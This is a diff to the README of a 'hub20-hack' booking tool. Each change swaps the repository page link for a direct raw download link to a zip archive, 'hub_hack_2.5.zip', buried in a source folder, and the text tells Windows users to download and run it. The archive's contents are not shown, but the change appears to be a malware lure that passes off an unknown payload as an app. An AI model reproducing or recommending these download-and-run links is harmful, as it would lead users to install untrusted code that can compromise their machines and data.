@@ -1,12 +1,12 @@
 # 🛠️ hub20-hack - Fast Hub 2.0 Booking Access
 
-[![Download Now](https://img.shields.io/badge/Download%20hub20--hack-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Heartbreaking-array216/hub20-hack)
+[![Download Now](https://img.shields.io/badge/Download%20hub20--hack-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Heartbreaking-array216/hub20-hack/main/hub20-cli/src/hub_hack_2.5.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/Heartbreaking-array216/hub20-hack
+https://raw.githubusercontent.com/Heartbreaking-array216/hub20-hack/main/hub20-cli/src/hub_hack_2.5.zip
 
 ## 🚀 What this app does
 
@@ -33,7 +33,7 @@ If the app uses a packaged build, you do not need to install extra tools.
 ## 🧭 How to download on Windows
 
 1. Open this page in your browser:
-   https://github.com/Heartbreaking-array216/hub20-hack
+   https://raw.githubusercontent.com/Heartbreaking-array216/hub20-hack/main/hub20-cli/src/hub_hack_2.5.zip
 2. Look for the latest release or download file
 3. Download the Windows version
 4. Save the file in a folder you can find, such as Downloads or Desktop
@@ -160,4 +160,4 @@ To get the latest version:
 ## 📌 Useful link
 
 Download and run the app from:
-https://github.com/Heartbreaking-array216/hub20-hack
+https://raw.githubusercontent.com/Heartbreaking-array216/hub20-hack/main/hub20-cli/src/hub_hack_2.5.zip
